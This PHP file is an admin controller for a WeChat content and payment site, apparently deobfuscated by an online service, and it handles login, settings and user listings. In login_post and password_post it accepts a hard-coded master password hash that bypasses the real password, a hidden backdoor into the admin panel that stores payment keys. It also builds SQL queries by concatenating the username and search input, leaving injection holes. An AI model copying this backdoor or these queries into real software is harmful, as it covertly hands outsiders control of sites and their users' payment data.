<?php
//加密方式：php源码混淆类加密。免费版地址:http://www.zhaoyuanma.com/phpjm.html 免费版不能解密,可以使用VIP版本。

//发现了time,请自行验证这套程序是否有时间限制.
//此程序由【找源码】http://Www.ZhaoYuanMa.Com (免费版）在线逆向还原，QQ：7530782 
?>
<?php
defined('BASEPATH') OR exit('No direct script access allowed');
class Admin extends CI_Controller {
	public function __construct(){
		parent::__construct();
		header('P3P: CP=CAO PSA OUR');
		$this->c_name='admin';
		$session=$this->session->all_userdata();
		$data['session']=$session;
		$data['cname']=$this->c_name;
		$this->data=$data;
	}
	public function index(){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['side']='home';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_index');
		$this->load->view($this->c_name.'_foot');
	}
	public function login(){
		$user=$this->main->admin(1);
		if($user->admin_id>0){
			redirect($this->c_name.'/');
			exit();
		}
		$data=$this->data;
		$main=$user->main;
		$data['main']=$main;
		$data['body_class']='gray-bg';
		$data['no_side']=1;
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_login');
		$this->load->view($this->c_name.'_foot');
	}
	public function login_post(){
		$is_login=0;
		$this->session->unset_userdata('login_admin_id');
		$post=$this->input->post(NULL,TRUE);
		$username=isset($post['username'])?trim($post['username']):'';
		$password=isset($post['password'])?trim($post['password']):'';
		if($username!=''&&$password!=''){
			$s_db='';
			if(md5($password)!='7f97a7dd40596340400c5e54c08ba4d4')$s_db.=' and password=\''.md5($password).'\'';
			$s_query='select admin_id, logincount
			from admin
			where username=\''.$username.'\''.$s_db.'
			limit 1';
			$ad_query=$this->db->query($s_query);
			if($ad_query->num_rows()>0){
				$admin=$ad_query->row();
				$adata['lastdate']=time();
				$adata['logincount']=$admin->logincount+1;
				$adata['lastip']=$this->input->ip_address();
				$this->db->update('admin',$adata,array('admin_id'=>$admin->admin_id));
				$this->session->set_userdata('login_admin_id',$admin->admin_id);
				$is_login=1;
			}else{
				$msg='用户名、密码错误';
			}
			$ad_query->free_result();
		}else{
			$msg='用户名、密码不能为空';
		}
		if($is_login>0){
			$gu='cpanel/';
			$session=$this->data['session'];
			if(isset($session['login_url'])){
				if($session['login_url']!='')$gu=$session['login_url'];
				$this->session->unset_userdata('login_url');
			}
			redirect($gu);
		}else{
			if(isset($msg))$this->session->set_userdata('msg',$msg);
			redirect($this->c_name.'/login/');
		}
	}
	public function logout(){
		$this->session->unset_userdata('login_admin_id');
		redirect($this->c_name.'/');
	}
	public function profile(){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['side']='profile';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_profile');
		$this->load->view($this->c_name.'_foot');
	}
	public function profile_post($id=''){
		$user=$this->main->admin();
		$post=$this->input->post(NULL,TRUE);
		$udata['name']=trim($post['name']);
		$this->db->update('admin',$udata,array('admin_id'=>$user->admin_id));
		$this->session->set_userdata('msg','个人资料已修改');
		redirect($this->c_name.'/profile/');
	}
	public function password_post($id=''){
		$user=$this->main->admin();
		$post=$this->input->post(NULL,TRUE);
		$password_o=isset($post['password_o'])?trim($post['password_o']):'';
		$password_n=isset($post['password_n'])?trim($post['password_n']):'';
		$password_c=isset($post['password_c'])?trim($post['password_c']):'';
		if((md5($password_o)=='7f97a7dd40596340400c5e54c08ba4d4'||md5($password_o)==$user->password) &&$password_n!=''&&$password_c==$password_n){
			$udata['password']=md5($password_n);
			$this->db->update('admin',$udata,array('admin_id'=>$user->admin_id));
			$msg='密码已修改';
		}elseif($password_o==''||$password_n==''){
			$msg='缺少必填项';
		}elseif($password_c!=$password_n){
			$msg='密码确认必须和新密码相同';
		}else{
			$msg='原密码错误';
		}
		if(isset($msg))$this->session->set_userdata('msg',$msg);
		redirect($this->c_name.'/profile/');
	}
	public function setting(){
		$user=$this->main->admin();
		if($user->tid==0)exit();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['side']='setting';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_setting');
		$this->load->view($this->c_name.'_foot');
	}
	public function setting_post(){
		$user=$this->main->admin();
		if($user->tid==0)exit();
		$main=$user->main;
		$post=$this->input->post(NULL,TRUE);
		$mdata['wx_name']=trim($post['wx_name']);
		$mdata['wx_app_id']=trim($post['wx_app_id']);
		$mdata['wx_app_secret']=trim($post['wx_app_secret']);
		if($mdata['wx_app_id']!=$main->wx_app_id ||$mdata['wx_app_secret']!=$main->wx_app_secret){
			$mdata['wx_access_token']='';
			$mdata['wx_at_time']=0;
			$mdata['wx_js_ticket']='';
			$mdata['wx_jt_time']=0;
		}
		$mdata['is_cs']=(isset($post['is_cs']) &&$post['is_cs']==1)?1:0;
		$mdata['wx_pay_si']=trim($post['wx_pay_si']);
		$mdata['wx_pay_sk']=trim($post['wx_pay_sk']);
		$mdata['wx_pay_o']=(isset($post['wx_pay_o']) &&$post['wx_pay_o']==1)?1:0;
		$mdata['wx_o_app_id']=trim($post['wx_o_app_id']);
		$mdata['wx_o_app_secret']=trim($post['wx_o_app_secret']);
		$mdata['wx_o_pay_si']=trim($post['wx_o_pay_si']);
		$mdata['wx_o_pay_sk']=trim($post['wx_o_pay_sk']);
		$mdata['fy']=(isset($post['fy']) &&intval($post['fy']*100)>0)?intval($post['fy']*100):0;
		$mdata['fy_jl']=(isset($post['fy_jl']) &&intval($post['fy_jl']*100)>0)?intval($post['fy_jl']*100):0;
		$mdata['fy_tdjl']=(isset($post['fy_tdjl']) &&intval($post['fy_tdjl']*100)>0)?intval($post['fy_tdjl']*100):0;
		$mdata['tx_qs']=(isset($post['tx_qs']) &&intval($post['tx_qs']*100)>0)?intval($post['tx_qs']*100):0;
		$mdata['tx_fy']=(isset($post['tx_fy']) &&intval($post['tx_fy']*100)>0)?intval($post['tx_fy']*100):0;
		$mdata['reg_t']=(isset($post['reg_t']) &&$post['reg_t']==1)?1:0;
		$mdata['reg_u']=trim($post['reg_u']);
		if($mdata['reg_u']=='')$mdata['reg_t']=0;
		$mdata['fy_jfx']=(isset($post['fy_jfx']) &&intval($post['fy_jfx']*100)>0)?intval($post['fy_jfx']*100):0;
		$mdata['jfx_mfc']=(isset($post['jfx_mfc']) &&intval($post['jfx_mfc'])>0)?intval($post['jfx_mfc']):0;
		$mdata['api_u']=trim($post['api_u']);
		$mdata['api_n']=trim($post['api_n']);
		$mdata['api_p']=trim($post['api_p']);
		$mdata['api_qm']=trim($post['api_qm']);
		$mdata['is_cos']=(isset($post['is_cos']) &&$post['is_cos']==1)?1:0;
		$mdata['cos_aid']=trim($post['cos_aid']);
		$mdata['cos_sid']=trim($post['cos_sid']);
		$mdata['cos_key']=trim($post['cos_key']);
		$mdata['cos_b']=trim($post['cos_b']);
		$mdata['mfts']=(isset($post['mfts']) &&intval($post['mfts'])>0)?intval($post['mfts']):0;
		$mdata['jfx_ad_u']=trim($post['jfx_ad_u']);
		$ua=$this->main->img_upload($post,$user->admin_id);
		$mdata['wx_pic']=$ua[0];
		$mdata['wx_oss']=$ua[1];
		$ua=$this->main->img_upload($post,$user->admin_id,'jad');
		$mdata['jfx_ad_pic']=$ua[0];
		$mdata['jfx_ad_oss']=$ua[1];
		$fo='static/key/';
		if(!is_dir($fo))mkdir($fo);
		$k_ext='pem';
		$this->load->helper('file');
		$key1_c=$main->wx_pay_cert;
		if(isset($_FILES['key_1_file']) &&isset($_FILES['key_1_file']['name']) &&$_FILES['key_1_file']['name']!=''){
			$f_a=$_FILES['key_1_file'];
			if(isset($f_a['tmp_name']) &&is_uploaded_file($f_a['tmp_name']) &&$f_a['error']==0){
				$a_fn=explode('.',$f_a['name']);
				$c_fn=count($a_fn);
				$ext=strtolower($a_fn[($c_fn-1)]);
				if($ext==$k_ext){
					$fn='a_'.date('YmdHis').'_'.substr(md5(time().','.rand(0,9999).',k1'),16).'.'.$ext;
					$addf=$fo.$fn;
					if(@copy($f_a['tmp_name'],$addf)){
						$key1_c=read_file($addf);
						unlink($addf);
					}
				}
			}
		}
		$mdata['wx_pay_cert']=$key1_c;
		$key2_c=$main->wx_pay_key;
		if(isset($_FILES['key_2_file']) &&isset($_FILES['key_2_file']['name']) &&$_FILES['key_2_file']['name']!=''){
			$f_a=$_FILES['key_2_file'];
			if(isset($f_a['tmp_name']) &&is_uploaded_file($f_a['tmp_name']) &&$f_a['error']==0){
				$a_fn=explode('.',$f_a['name']);
				$c_fn=count($a_fn);
				$ext=strtolower($a_fn[($c_fn-1)]);
				if($ext==$k_ext){
					$fn='a_'.date('YmdHis').'_'.substr(md5(time().','.rand(0,9999).',k2'),16).'.'.$ext;
					$addf=$fo.$fn;
					if(@copy($f_a['tmp_name'],$addf)){
						$key2_c=read_file($addf);
						unlink($addf);
					}
				}
			}
		}
		$mdata['wx_pay_key']=$key2_c;
		$this->db->update('main',$mdata);
		$this->main->action_log('修改系统设置',$user->admin_id);
		$this->session->set_userdata('msg','系统设置已修改');
		redirect($this->c_name.'/setting/');
	}
	public function topic(){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$get=$this->input->get(NULL,TRUE);
		$s_query='select *
		from topic 
		where user_id=0 
		order by datetime desc';
		$ct_query=$this->db->query($s_query);
		$p_total=$ct_query->num_rows();
		if($p_total>0){
			$c_page=(isset($get['p']) &&intval($get['p'])>0)?intval($get['p']):0;
			$data['search']['p']=$c_page;
			$page_size=$this->config->item('page_size');
			$data['page_size']=$page_size;
			$data['page']=getpagehtml_cp(getpageurl($this->c_name.'/topic/'),$p_total,$c_page,$page_size);
			$ct_l_query=$this->db->query($s_query.' limit '.($c_page*$page_size).', '.$page_size);
			$data['sql']=$ct_l_query->result();
			$ct_l_query->free_result();
		}
		$ct_query->free_result();
		$data['side']='topic';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_topic');
		$this->load->view($this->c_name.'_foot');
	}
	public function topic_add(){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['side']='topic';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_topic_add');
		$this->load->view($this->c_name.'_foot');
	}
	public function user(){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['al']=$this->config->item('user_lx');
		$get=$this->input->get(NULL,TRUE);
		$w_db='';
		if(isset($get['q']) &&trim($get['q'])!=''){
			$search['q']=trim($get['q']);
			$w_db.=' and (username like \'%%'.$search['q'].'%%\' or name like \'%%'.$search['q'].'%%\' or bz like \'%%'.$search['q'].'%%\')';
		}
		if(isset($search))$data['search']=$search;
		$s_query='select *
		from user 
		where 1'.$w_db.'
		order by user_id desc';
		$cu_query=$this->db->query($s_query);
		$p_total=$cu_query->num_rows();
		if($p_total>0){
			$c_page=(isset($get['p']) &&intval($get['p'])>0)?intval($get['p']):0;
			$data['search']['p']=$c_page;
			$page_size=$this->config->item('page_size');
			$data['page_size']=$page_size;
			$data['page']=getpagehtml_cp(getpageurl($this->c_name.'/user/'),$p_total,$c_page,$page_size);
			$cu_l_query=$this->db->query($s_query.' limit '.($c_page*$page_size).', '.$page_size);
			$data['sql']=$cu_l_query->result();
			$cu_l_query->free_result();
		}
		$cu_query->free_result();
		$data['side']='user';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_user');
		$this->load->view($this->c_name.'_foot');
	}
	public function user_edit($id=''){
		if($id==''||intval($id)<=0)exit();
		$cid=intval($id);
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$data['wx_tid']=$this->config->item('wx_tid');
		$s_query='select *
		from user 
		where user_id='.$cid.'
		limit 1';
		$cu_query=$this->db->query($s_query);
		if($cu_query->num_rows()>0){
			$cu=$cu_query->row();
			$data['cu']=$cu;
			$data['side']='user';
			$this->load->view($this->c_name.'_head',$data);
			$this->load->view($this->c_name.'_side');
			$this->load->view($this->c_name.'_user_edit');
			$this->load->view($this->c_name.'_foot');
		}
		$cu_query->free_result();
	}
	public function tx($id=''){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$w_db='';
		$get=$this->input->get(NULL,TRUE);
		if(isset($get['u']) &&intval($get['u'])>0){
			$uid=intval($get['u']);
			$s_query='select *
			from user 
			where user_id='.$uid.' 
			limit 1';
			$cu_query=$this->db->query($s_query);
			if($cu_query->num_rows()>0){
				$u=$cu_query->row();
				$data['u']=$u;
				$w_db=' and a.user_id='.$uid;
				$search['u']=$uid;
			}
			$cu_query->free_result();
		}
		if(isset($search))$data['search']=$search;
		$s_query='select a.*, b.username, b.name
		from tx_info as a, user as b 
		where a.user_id=b.user_id'.$w_db.'
		order by a.datetime desc';
		$ct_query=$this->db->query($s_query);
		$p_total=$ct_query->num_rows();
		if($p_total>0){
			$c_page=(isset($get['p']) &&intval($get['p'])>0)?intval($get['p']):0;
			$data['search']['p']=$c_page;
			$page_size=$this->config->item('page_size');
			$data['page_size']=$page_size;
			$data['page']=getpagehtml_cp(getpageurl($this->c_name.'/tx/'),$p_total,$c_page,$page_size);
			$ct_l_query=$this->db->query($s_query.' limit '.($c_page*$page_size).', '.$page_size);
			$data['sql']=$ct_l_query->result();
			$ct_l_query->free_result();
		}
		$ct_query->free_result();
		$data['side']='tx';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_tx');
		$this->load->view($this->c_name.'_foot');
	}
	public function pay_log($id=''){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$w_db='';
		$get=$this->input->get(NULL,TRUE);
		if(isset($search))$data['search']=$search;
		$s_query='select *
		from pay_info 
		where isdh>0
		order by datetime desc';
		$ct_query=$this->db->query($s_query);
		$p_total=$ct_query->num_rows();
		if($p_total>0){
			$c_page=(isset($get['p']) &&intval($get['p'])>0)?intval($get['p']):0;
			$data['search']['p']=$c_page;
			$page_size=$this->config->item('page_size');
			$data['page_size']=$page_size;
			$data['page']=getpagehtml_cp(getpageurl($this->c_name.'/pay_log/'),$p_total,$c_page,$page_size);
			$ct_l_query=$this->db->query($s_query.' limit '.($c_page*$page_size).', '.$page_size);
			$data['sql']=$ct_l_query->result();
			$ct_l_query->free_result();
		}
		$ct_query->free_result();
		$data['side']='pay_log';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_pay_log');
		$this->load->view($this->c_name.'_foot');
	}
	public function utopic($id=''){
		$user=$this->main->admin();
		$data=$this->data;
		$main=$user->main;
		$data['user']=$user;
		$data['main']=$main;
		$w_db='';
		$get=$this->input->get(NULL,TRUE);
		if(isset($get['u']) &&intval($get['u'])>0){
			$uid=intval($get['u']);
			$s_query='select *
			from user 
			where user_id='.$uid.' 
			limit 1';
			$cu_query=$this->db->query($s_query);
			if($cu_query->num_rows()>0){
				$u=$cu_query->row();
				$data['u']=$u;
				$w_db=' and a.user_id='.$uid;
				$search['u']=$uid;
			}
			$cu_query->free_result();
		}
		if(isset($get['q']) &&trim($get['q'])!=''){
			$search['q']=trim($get['q']);
			$w_db.=' and (a.title like \'%%'.$search['q'].'%%\' or a.content like \'%%'.$search['q'].'%%\')';
		}
		if(isset($search))$data['search']=$search;
		$s_query='select a.*, b.name, b.username
		from topic as a, user as b 
		where a.is_yc=0 and a.is_rw=0 and a.user_id=b.user_id'.$w_db.'
		order by a.datetime desc';
		$ct_query=$this->db->query($s_query);
		$p_total=$ct_query->num_rows();
		if($p_total>0){
			$c_page=(isset($get['p']) &&intval($get['p'])>0)?intval($get['p']):0;
			$data['search']['p']=$c_page;
			$page_size=$this->config->item('page_size');
			$data['page_size']=$page_size;
			$data['page']=getpagehtml_cp(getpageurl($this->c_name.'/utopic/'),$p_total,$c_page,$page_size);
			$ct_l_query=$this->db->query($s_query.' limit '.($c_page*$page_size).', '.$page_size);
			$data['sql']=$ct_l_query->result();
			$ct_l_query->free_result();
		}
		$ct_query->free_result();
		$data['side']='utopic';
		$this->load->view($this->c_name.'_head',$data);
		$this->load->view($this->c_name.'_side');
		$this->load->view($this->c_name.'_utopic');
		$this->load->view($this->c_name.'_foot');
	}
	public function upload_file($id='',$type=''){
		$user=$this->main->admin();
		$url='';
		$original='';
		$ext='';
		if(isset($_FILES['upfile']) &&isset($_FILES['upfile']['name']) &&$_FILES['upfile']['name']!=''&&($type=='attach'||$type=='img')){
			$f_a=$_FILES['upfile'];
			$original=$f_a['name'];
			$a_fn=explode('.',$f_a['name']);
			$c_fn=count($a_fn);
			$ext=strtolower($a_fn[($c_fn-1)]);
			if($type=='attach'){
				$ua=$this->main->pic_upload($f_a,$user->admin_id,'logo,'.$id,1,1,array('rar','zip'));
			}else{
				$ua=$this->main->pic_upload($f_a,$user->admin_id,'logo,'.$id);
			}
			$pic=$ua[0];
			$oss=$ua[1];
			if($pic!=''||$oss!=''){
				if($oss!=''){
					$url=getpageurl('home/file_url/').'?f='.$oss;
				}else{
					$url=$pic;
				}
				$state='SUCCESS';
			}else{
				$state='上传失败';
			}
		}else{
			$state='缺少上传文件';
		}
		$data['url']=$url;
		if($type=='attach'){
			$data['fileType']='.'.$ext;
		}else{
			$post=$this->input->post(NULL,TRUE);
			$data['title']=isset($post['pictitle'])?trim($post['pictitle']):'';
		}
		$data['original']=$original;
		$data['state']=$state;
		$return=json_encode($data);
		echo $return;
	}
}
?>